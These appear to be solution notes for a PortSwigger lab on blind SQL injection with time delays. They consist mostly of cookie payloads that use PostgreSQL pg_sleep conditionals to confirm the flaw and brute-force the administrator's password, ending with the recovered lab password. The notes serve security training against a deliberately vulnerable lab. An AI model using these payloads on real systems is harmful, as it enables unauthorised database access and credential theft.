# Lab: Blind SQL injection with time delays and information retrieval
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

```bash
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select pg_sleep(10))--;      
```
```bash
#First one will make you wait second won't.
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--

Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (1=0) then pg_sleep(10) else pg_sleep(0) end)--;
```
```bash
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users)--;
```
```bash
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users)--;
```
```bash
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (LENGTH(password)>1) then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')--;

# We will brute force
# Password Length = 20

# You can also use this version they are same:
TrackingId=o9wUzXJXTWodlna6'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
```bash
Cookie: TrackingId=o9wUzXJXTWodlna6' || (select case when (substring(password,1,1)='a') then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')--;
# clusterbomb
```
```bash
password: 6xe8w9rdveei10dm2qw6
```
